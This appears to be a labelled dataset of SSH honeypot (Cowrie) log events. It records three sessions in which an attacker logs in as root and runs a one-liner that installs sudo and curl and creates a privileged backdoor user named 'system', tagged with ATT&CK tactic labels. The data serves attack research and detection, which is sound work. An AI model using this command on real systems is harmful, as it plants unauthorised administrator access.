,event,session_id,session,labels
1156,"{""compCS"": [""none""], ""encCS"": [""aes128-gcm@openssh.com"", ""chacha20-poly1305@openssh.com"", ""aes128-ctr"", ""aes192-ctr"", ""aes256-ctr""], ""eventid"": ""cowrie.client.kex"", ""hash"": ""4e066189c3bbeec38c99b1855113733a"", ""hashAlgorithms"": ""curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,ext-info-c;aes128-gcm@openssh.com,chacha20-poly1305@openssh.com,aes128-ctr,aes192-ctr,aes256-ctr;hmac-sha2-256-etm@openssh.com,hmac-sha2-256,hmac-sha1,hmac-sha1-96;none"", ""kexAlgs"": [""curve25519-sha256"", ""curve25519-sha256@libssh.org"", ""ecdh-sha2-nistp256"", ""ecdh-sha2-nistp384"", ""ecdh-sha2-nistp521"", ""diffie-hellman-group14-sha256"", ""diffie-hellman-group14-sha1"", ""ext-info-c""], ""keyAlgs"": [""rsa-sha2-512-cert-v01@openssh.com"", ""rsa-sha2-256-cert-v01@openssh.com"", ""ssh-rsa-cert-v01@openssh.com"", ""ssh-dss-cert-v01@openssh.com"", ""ecdsa-sha2-nistp256-cert-v01@openssh.com"", ""ecdsa-sha2-nistp384-cert-v01@openssh.com"", ""ecdsa-sha2-nistp521-cert-v01@openssh.com"", ""ssh-ed25519-cert-v01@openssh.com"", ""ecdsa-sha2-nistp256"", ""ecdsa-sha2-nistp384"", ""ecdsa-sha2-nistp521"", ""rsa-sha2-512"", ""rsa-sha2-256"", ""ssh-rsa"", ""ssh-dss"", ""ssh-ed25519""], ""langCS"": [""""], ""macCS"": [""hmac-sha2-256-etm@openssh.com"", ""hmac-sha2-256"", ""hmac-sha1"", ""hmac-sha1-96""], ""message"": ""SSH client hassh fingerprint: 4e066189c3bbeec38c99b1855113733a"", ""sensor"": ""cowrie-azure-worker-00-8ff84698d-4226n"", ""src_ip"": ""10.42.4.1"", ""timestamp"": ""2025-08-04T23:41:39.338908Z"", ""session_id"": ""bd2fcde9322f""}",bd2fcde9322f,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 XfGr7vMY) system  && sudo usermod -aG sudo system ; openssl passwd -1 XfGr7vMY;,"['Discovery', 'Impact', 'Persistence', 'Initial Access', 'Command and Control']"
1157,"{""eventid"": ""cowrie.login.success"", ""message"": ""login attempt [root/0] succeeded"", ""password"": ""0"", ""sensor"": ""cowrie-azure-worker-00-8ff84698d-4226n"", ""src_ip"": ""10.42.4.1"", ""timestamp"": ""2025-08-04T23:41:39.758617Z"", ""username"": ""root"", ""session_id"": ""bd2fcde9322f""}",bd2fcde9322f,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 XfGr7vMY) system  && sudo usermod -aG sudo system ; openssl passwd -1 XfGr7vMY;,"['Discovery', 'Impact', 'Persistence', 'Initial Access', 'Command and Control']"
1158,"{""arch"": ""linux-x64-lsb"", ""eventid"": ""cowrie.session.params"", ""message"": ""[]"", ""sensor"": ""cowrie-azure-worker-00-8ff84698d-4226n"", ""src_ip"": ""10.42.4.1"", ""timestamp"": ""2025-08-04T23:41:40.129642Z"", ""session_id"": ""bd2fcde9322f""}",bd2fcde9322f,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 XfGr7vMY) system  && sudo usermod -aG sudo system ; openssl passwd -1 XfGr7vMY;,"['Discovery', 'Impact', 'Persistence', 'Initial Access', 'Command and Control']"
1159,"{""eventid"": ""cowrie.command.input"", ""input"": ""apt update && apt install sudo curl -y && sudo useradd -m -p $(openssl passwd -1 XfGr7vMY) system && sudo usermod -aG sudo system"", ""message"": ""CMD: apt update && apt install sudo curl -y && sudo useradd -m -p $(openssl passwd -1 XfGr7vMY) system && sudo usermod -aG sudo system"", ""sensor"": ""cowrie-azure-worker-00-8ff84698d-4226n"", ""src_ip"": ""10.42.4.1"", ""timestamp"": ""2025-08-04T23:41:40.130000Z"", ""session_id"": ""bd2fcde9322f""}",bd2fcde9322f,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 XfGr7vMY) system  && sudo usermod -aG sudo system ; openssl passwd -1 XfGr7vMY;,"['Discovery', 'Impact', 'Persistence', 'Initial Access', 'Command and Control']"
1160,"{""eventid"": ""cowrie.command.input"", ""input"": ""openssl passwd -1 XfGr7vMY"", ""message"": ""CMD: openssl passwd -1 XfGr7vMY"", ""sensor"": ""cowrie-azure-worker-00-8ff84698d-4226n"", ""src_ip"": ""10.42.4.1"", ""timestamp"": ""2025-08-04T23:41:40.130390Z"", ""session_id"": ""bd2fcde9322f""}",bd2fcde9322f,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 XfGr7vMY) system  && sudo usermod -aG sudo system ; openssl passwd -1 XfGr7vMY;,"['Discovery', 'Impact', 'Persistence', 'Initial Access', 'Command and Control']"
1161,"{""eventid"": ""cowrie.command.failed"", ""input"": ""openssl passwd -1 XfGr7vMY"", ""message"": ""Command not found: openssl passwd -1 XfGr7vMY"", ""sensor"": ""cowrie-azure-worker-00-8ff84698d-4226n"", ""src_ip"": ""10.42.4.1"", ""timestamp"": ""2025-08-04T23:41:40.131011Z"", ""session_id"": ""bd2fcde9322f""}",bd2fcde9322f,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 XfGr7vMY) system  && sudo usermod -aG sudo system ; openssl passwd -1 XfGr7vMY;,"['Discovery', 'Impact', 'Persistence', 'Initial Access', 'Command and Control']"
1162,"{""duplicate"": false, ""duration"": ""0.1"", ""eventid"": ""cowrie.log.closed"", ""message"": ""Closing TTY Log: var/lib/cowrie/tty/4fa10e925038edd20322c5e66837415908c9cec378cdc9ba800427c9a08cc08c after 0.1 seconds"", ""sensor"": ""cowrie-azure-worker-00-8ff84698d-4226n"", ""shasum"": ""4fa10e925038edd20322c5e66837415908c9cec378cdc9ba800427c9a08cc08c"", ""size"": 154.0, ""src_ip"": ""10.42.4.1"", ""timestamp"": ""2025-08-04T23:41:40.270226Z"", ""ttylog"": ""var/lib/cowrie/tty/4fa10e925038edd20322c5e66837415908c9cec378cdc9ba800427c9a08cc08c"", ""session_id"": ""bd2fcde9322f""}",bd2fcde9322f,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 XfGr7vMY) system  && sudo usermod -aG sudo system ; openssl passwd -1 XfGr7vMY;,"['Discovery', 'Impact', 'Persistence', 'Initial Access', 'Command and Control']"
1163,"{""duration"": ""1.0"", ""eventid"": ""cowrie.session.closed"", ""message"": ""Connection lost after 1.0 seconds"", ""sensor"": ""cowrie-azure-worker-00-8ff84698d-4226n"", ""src_ip"": ""10.42.4.1"", ""timestamp"": ""2025-08-04T23:41:40.271312Z"", ""session_id"": ""bd2fcde9322f""}",bd2fcde9322f,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 XfGr7vMY) system  && sudo usermod -aG sudo system ; openssl passwd -1 XfGr7vMY;,"['Discovery', 'Impact', 'Persistence', 'Initial Access', 'Command and Control']"
1164,"{""dst_ip"": ""10.42.4.33"", ""dst_port"": 2222.0, ""eventid"": ""cowrie.session.connect"", ""message"": ""New connection: 10.42.4.1:1330 (10.42.4.33:2222) [session: a4dc0b13013f]"", ""protocol"": ""ssh"", ""sensor"": ""cowrie-azure-worker-00-8ff84698d-4226n"", ""src_ip"": ""10.42.4.1"", ""src_port"": 1330.0, ""timestamp"": ""2025-08-14T20:03:11.946944Z"", ""session_id"": ""a4dc0b13013f""}",a4dc0b13013f,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 wckTqQsE) system  && sudo usermod -aG sudo system ; openssl passwd -1 wckTqQsE;,"['Discovery', 'Impact', 'Initial Access', 'Command and Control']"
1165,"{""eventid"": ""cowrie.client.version"", ""message"": ""Remote SSH version: SSH-2.0-Go"", ""sensor"": ""cowrie-azure-worker-00-8ff84698d-4226n"", ""src_ip"": ""10.42.4.1"", ""timestamp"": ""2025-08-14T20:03:11.947342Z"", ""version"": ""SSH-2.0-Go"", ""session_id"": ""a4dc0b13013f""}",a4dc0b13013f,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 wckTqQsE) system  && sudo usermod -aG sudo system ; openssl passwd -1 wckTqQsE;,"['Discovery', 'Impact', 'Initial Access', 'Command and Control']"
1166,"{""compCS"": [""none""], ""encCS"": [""aes128-gcm@openssh.com"", ""chacha20-poly1305@openssh.com"", ""aes128-ctr"", ""aes192-ctr"", ""aes256-ctr""], ""eventid"": ""cowrie.client.kex"", ""hash"": ""4e066189c3bbeec38c99b1855113733a"", ""hashAlgorithms"": ""curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,ext-info-c;aes128-gcm@openssh.com,chacha20-poly1305@openssh.com,aes128-ctr,aes192-ctr,aes256-ctr;hmac-sha2-256-etm@openssh.com,hmac-sha2-256,hmac-sha1,hmac-sha1-96;none"", ""kexAlgs"": [""curve25519-sha256"", ""curve25519-sha256@libssh.org"", ""ecdh-sha2-nistp256"", ""ecdh-sha2-nistp384"", ""ecdh-sha2-nistp521"", ""diffie-hellman-group14-sha256"", ""diffie-hellman-group14-sha1"", ""ext-info-c""], ""keyAlgs"": [""rsa-sha2-512-cert-v01@openssh.com"", ""rsa-sha2-256-cert-v01@openssh.com"", ""ssh-rsa-cert-v01@openssh.com"", ""ssh-dss-cert-v01@openssh.com"", ""ecdsa-sha2-nistp256-cert-v01@openssh.com"", ""ecdsa-sha2-nistp384-cert-v01@openssh.com"", ""ecdsa-sha2-nistp521-cert-v01@openssh.com"", ""ssh-ed25519-cert-v01@openssh.com"", ""ecdsa-sha2-nistp256"", ""ecdsa-sha2-nistp384"", ""ecdsa-sha2-nistp521"", ""rsa-sha2-512"", ""rsa-sha2-256"", ""ssh-rsa"", ""ssh-dss"", ""ssh-ed25519""], ""langCS"": [""""], ""macCS"": [""hmac-sha2-256-etm@openssh.com"", ""hmac-sha2-256"", ""hmac-sha1"", ""hmac-sha1-96""], ""message"": ""SSH client hassh fingerprint: 4e066189c3bbeec38c99b1855113733a"", ""sensor"": ""cowrie-azure-worker-00-8ff84698d-4226n"", ""src_ip"": ""10.42.4.1"", ""timestamp"": ""2025-08-14T20:03:12.050885Z"", ""session_id"": ""a4dc0b13013f""}",a4dc0b13013f,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 wckTqQsE) system  && sudo usermod -aG sudo system ; openssl passwd -1 wckTqQsE;,"['Discovery', 'Impact', 'Initial Access', 'Command and Control']"
1167,"{""eventid"": ""cowrie.login.success"", ""message"": ""login attempt [root/0] succeeded"", ""password"": ""0"", ""sensor"": ""cowrie-azure-worker-00-8ff84698d-4226n"", ""src_ip"": ""10.42.4.1"", ""timestamp"": ""2025-08-14T20:03:12.363684Z"", ""username"": ""root"", ""session_id"": ""a4dc0b13013f""}",a4dc0b13013f,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 wckTqQsE) system  && sudo usermod -aG sudo system ; openssl passwd -1 wckTqQsE;,"['Discovery', 'Impact', 'Initial Access', 'Command and Control']"
1168,"{""arch"": ""linux-x64-lsb"", ""eventid"": ""cowrie.session.params"", ""message"": ""[]"", ""sensor"": ""cowrie-azure-worker-00-8ff84698d-4226n"", ""src_ip"": ""10.42.4.1"", ""timestamp"": ""2025-08-14T20:03:12.590466Z"", ""session_id"": ""a4dc0b13013f""}",a4dc0b13013f,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 wckTqQsE) system  && sudo usermod -aG sudo system ; openssl passwd -1 wckTqQsE;,"['Discovery', 'Impact', 'Initial Access', 'Command and Control']"
1169,"{""eventid"": ""cowrie.command.input"", ""input"": ""apt update && apt install sudo curl -y && sudo useradd -m -p $(openssl passwd -1 wckTqQsE) system && sudo usermod -aG sudo system"", ""message"": ""CMD: apt update && apt install sudo curl -y && sudo useradd -m -p $(openssl passwd -1 wckTqQsE) system && sudo usermod -aG sudo system"", ""sensor"": ""cowrie-azure-worker-00-8ff84698d-4226n"", ""src_ip"": ""10.42.4.1"", ""timestamp"": ""2025-08-14T20:03:12.590829Z"", ""session_id"": ""a4dc0b13013f""}",a4dc0b13013f,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 wckTqQsE) system  && sudo usermod -aG sudo system ; openssl passwd -1 wckTqQsE;,"['Discovery', 'Impact', 'Initial Access', 'Command and Control']"
1170,"{""eventid"": ""cowrie.command.input"", ""input"": ""openssl passwd -1 wckTqQsE"", ""message"": ""CMD: openssl passwd -1 wckTqQsE"", ""sensor"": ""cowrie-azure-worker-00-8ff84698d-4226n"", ""src_ip"": ""10.42.4.1"", ""timestamp"": ""2025-08-14T20:03:12.591144Z"", ""session_id"": ""a4dc0b13013f""}",a4dc0b13013f,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 wckTqQsE) system  && sudo usermod -aG sudo system ; openssl passwd -1 wckTqQsE;,"['Discovery', 'Impact', 'Initial Access', 'Command and Control']"
1171,"{""eventid"": ""cowrie.command.failed"", ""input"": ""openssl passwd -1 wckTqQsE"", ""message"": ""Command not found: openssl passwd -1 wckTqQsE"", ""sensor"": ""cowrie-azure-worker-00-8ff84698d-4226n"", ""src_ip"": ""10.42.4.1"", ""timestamp"": ""2025-08-14T20:03:12.591815Z"", ""session_id"": ""a4dc0b13013f""}",a4dc0b13013f,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 wckTqQsE) system  && sudo usermod -aG sudo system ; openssl passwd -1 wckTqQsE;,"['Discovery', 'Impact', 'Initial Access', 'Command and Control']"
1172,"{""duplicate"": false, ""duration"": ""0.1"", ""eventid"": ""cowrie.log.closed"", ""message"": ""Closing TTY Log: var/lib/cowrie/tty/a9db937731827865589eb6ceaead06c78ba6b2c6546336058258ed642fa2b4d2 after 0.1 seconds"", ""sensor"": ""cowrie-azure-worker-00-8ff84698d-4226n"", ""shasum"": ""a9db937731827865589eb6ceaead06c78ba6b2c6546336058258ed642fa2b4d2"", ""size"": 154.0, ""src_ip"": ""10.42.4.1"", ""timestamp"": ""2025-08-14T20:03:12.696798Z"", ""ttylog"": ""var/lib/cowrie/tty/a9db937731827865589eb6ceaead06c78ba6b2c6546336058258ed642fa2b4d2"", ""session_id"": ""a4dc0b13013f""}",a4dc0b13013f,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 wckTqQsE) system  && sudo usermod -aG sudo system ; openssl passwd -1 wckTqQsE;,"['Discovery', 'Impact', 'Initial Access', 'Command and Control']"
1173,"{""duration"": ""0.8"", ""eventid"": ""cowrie.session.closed"", ""message"": ""Connection lost after 0.8 seconds"", ""sensor"": ""cowrie-azure-worker-00-8ff84698d-4226n"", ""src_ip"": ""10.42.4.1"", ""timestamp"": ""2025-08-14T20:03:12.697334Z"", ""session_id"": ""a4dc0b13013f""}",a4dc0b13013f,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 wckTqQsE) system  && sudo usermod -aG sudo system ; openssl passwd -1 wckTqQsE;,"['Discovery', 'Impact', 'Initial Access', 'Command and Control']"
1174,"{""dst_ip"": ""10.42.4.33"", ""dst_port"": 2222.0, ""eventid"": ""cowrie.session.connect"", ""message"": ""New connection: 10.42.4.1:59800 (10.42.4.33:2222) [session: 9688e0996ff3]"", ""protocol"": ""ssh"", ""sensor"": ""cowrie-azure-worker-00-8ff84698d-4226n"", ""src_ip"": ""10.42.4.1"", ""src_port"": 59800.0, ""timestamp"": ""2025-08-11T13:30:32.099229Z"", ""session_id"": ""9688e0996ff3""}",9688e0996ff3,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 pT3rDgRu) system  && sudo usermod -aG sudo system ; openssl passwd -1 pT3rDgRu;,"['Discovery', 'Impact', 'Persistence', 'Initial Access', 'Command and Control']"
1175,"{""eventid"": ""cowrie.client.version"", ""message"": ""Remote SSH version: SSH-2.0-Go"", ""sensor"": ""cowrie-azure-worker-00-8ff84698d-4226n"", ""src_ip"": ""10.42.4.1"", ""timestamp"": ""2025-08-11T13:30:32.099705Z"", ""version"": ""SSH-2.0-Go"", ""session_id"": ""9688e0996ff3""}",9688e0996ff3,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 pT3rDgRu) system  && sudo usermod -aG sudo system ; openssl passwd -1 pT3rDgRu;,"['Discovery', 'Impact', 'Persistence', 'Initial Access', 'Command and Control']"
1176,"{""compCS"": [""none""], ""encCS"": [""aes128-gcm@openssh.com"", ""chacha20-poly1305@openssh.com"", ""aes128-ctr"", ""aes192-ctr"", ""aes256-ctr""], ""eventid"": ""cowrie.client.kex"", ""hash"": ""4e066189c3bbeec38c99b1855113733a"", ""hashAlgorithms"": ""curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,ext-info-c;aes128-gcm@openssh.com,chacha20-poly1305@openssh.com,aes128-ctr,aes192-ctr,aes256-ctr;hmac-sha2-256-etm@openssh.com,hmac-sha2-256,hmac-sha1,hmac-sha1-96;none"", ""kexAlgs"": [""curve25519-sha256"", ""curve25519-sha256@libssh.org"", ""ecdh-sha2-nistp256"", ""ecdh-sha2-nistp384"", ""ecdh-sha2-nistp521"", ""diffie-hellman-group14-sha256"", ""diffie-hellman-group14-sha1"", ""ext-info-c""], ""keyAlgs"": [""rsa-sha2-512-cert-v01@openssh.com"", ""rsa-sha2-256-cert-v01@openssh.com"", ""ssh-rsa-cert-v01@openssh.com"", ""ssh-dss-cert-v01@openssh.com"", ""ecdsa-sha2-nistp256-cert-v01@openssh.com"", ""ecdsa-sha2-nistp384-cert-v01@openssh.com"", ""ecdsa-sha2-nistp521-cert-v01@openssh.com"", ""ssh-ed25519-cert-v01@openssh.com"", ""ecdsa-sha2-nistp256"", ""ecdsa-sha2-nistp384"", ""ecdsa-sha2-nistp521"", ""rsa-sha2-512"", ""rsa-sha2-256"", ""ssh-rsa"", ""ssh-dss"", ""ssh-ed25519""], ""langCS"": [""""], ""macCS"": [""hmac-sha2-256-etm@openssh.com"", ""hmac-sha2-256"", ""hmac-sha1"", ""hmac-sha1-96""], ""message"": ""SSH client hassh fingerprint: 4e066189c3bbeec38c99b1855113733a"", ""sensor"": ""cowrie-azure-worker-00-8ff84698d-4226n"", ""src_ip"": ""10.42.4.1"", ""timestamp"": ""2025-08-11T13:30:32.192291Z"", ""session_id"": ""9688e0996ff3""}",9688e0996ff3,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 pT3rDgRu) system  && sudo usermod -aG sudo system ; openssl passwd -1 pT3rDgRu;,"['Discovery', 'Impact', 'Persistence', 'Initial Access', 'Command and Control']"
1177,"{""eventid"": ""cowrie.login.success"", ""message"": ""login attempt [root/0] succeeded"", ""password"": ""0"", ""sensor"": ""cowrie-azure-worker-00-8ff84698d-4226n"", ""src_ip"": ""10.42.4.1"", ""timestamp"": ""2025-08-11T13:30:32.472433Z"", ""username"": ""root"", ""session_id"": ""9688e0996ff3""}",9688e0996ff3,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 pT3rDgRu) system  && sudo usermod -aG sudo system ; openssl passwd -1 pT3rDgRu;,"['Discovery', 'Impact', 'Persistence', 'Initial Access', 'Command and Control']"
1178,"{""arch"": ""linux-x64-lsb"", ""eventid"": ""cowrie.session.params"", ""message"": ""[]"", ""sensor"": ""cowrie-azure-worker-00-8ff84698d-4226n"", ""src_ip"": ""10.42.4.1"", ""timestamp"": ""2025-08-11T13:30:32.762257Z"", ""session_id"": ""9688e0996ff3""}",9688e0996ff3,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 pT3rDgRu) system  && sudo usermod -aG sudo system ; openssl passwd -1 pT3rDgRu;,"['Discovery', 'Impact', 'Persistence', 'Initial Access', 'Command and Control']"
1179,"{""eventid"": ""cowrie.command.input"", ""input"": ""apt update && apt install sudo curl -y && sudo useradd -m -p $(openssl passwd -1 pT3rDgRu) system && sudo usermod -aG sudo system"", ""message"": ""CMD: apt update && apt install sudo curl -y && sudo useradd -m -p $(openssl passwd -1 pT3rDgRu) system && sudo usermod -aG sudo system"", ""sensor"": ""cowrie-azure-worker-00-8ff84698d-4226n"", ""src_ip"": ""10.42.4.1"", ""timestamp"": ""2025-08-11T13:30:32.762643Z"", ""session_id"": ""9688e0996ff3""}",9688e0996ff3,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 pT3rDgRu) system  && sudo usermod -aG sudo system ; openssl passwd -1 pT3rDgRu;,"['Discovery', 'Impact', 'Persistence', 'Initial Access', 'Command and Control']"
1180,"{""eventid"": ""cowrie.command.input"", ""input"": ""openssl passwd -1 pT3rDgRu"", ""message"": ""CMD: openssl passwd -1 pT3rDgRu"", ""sensor"": ""cowrie-azure-worker-00-8ff84698d-4226n"", ""src_ip"": ""10.42.4.1"", ""timestamp"": ""2025-08-11T13:30:32.763091Z"", ""session_id"": ""9688e0996ff3""}",9688e0996ff3,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 pT3rDgRu) system  && sudo usermod -aG sudo system ; openssl passwd -1 pT3rDgRu;,"['Discovery', 'Impact', 'Persistence', 'Initial Access', 'Command and Control']"
1181,"{""eventid"": ""cowrie.command.failed"", ""input"": ""openssl passwd -1 pT3rDgRu"", ""message"": ""Command not found: openssl passwd -1 pT3rDgRu"", ""sensor"": ""cowrie-azure-worker-00-8ff84698d-4226n"", ""src_ip"": ""10.42.4.1"", ""timestamp"": ""2025-08-11T13:30:32.763779Z"", ""session_id"": ""9688e0996ff3""}",9688e0996ff3,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 pT3rDgRu) system  && sudo usermod -aG sudo system ; openssl passwd -1 pT3rDgRu;,"['Discovery', 'Impact', 'Persistence', 'Initial Access', 'Command and Control']"
1182,"{""duplicate"": false, ""duration"": ""0.1"", ""eventid"": ""cowrie.log.closed"", ""message"": ""Closing TTY Log: var/lib/cowrie/tty/34bb5a64763eff22a6f807cd68884fc6565f81a0d5ad3accbe87c8ee474442e8 after 0.1 seconds"", ""sensor"": ""cowrie-azure-worker-00-8ff84698d-4226n"", ""shasum"": ""34bb5a64763eff22a6f807cd68884fc6565f81a0d5ad3accbe87c8ee474442e8"", ""size"": 154.0, ""src_ip"": ""10.42.4.1"", ""timestamp"": ""2025-08-11T13:30:32.857887Z"", ""ttylog"": ""var/lib/cowrie/tty/34bb5a64763eff22a6f807cd68884fc6565f81a0d5ad3accbe87c8ee474442e8"", ""session_id"": ""9688e0996ff3""}",9688e0996ff3,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 pT3rDgRu) system  && sudo usermod -aG sudo system ; openssl passwd -1 pT3rDgRu;,"['Discovery', 'Impact', 'Persistence', 'Initial Access', 'Command and Control']"
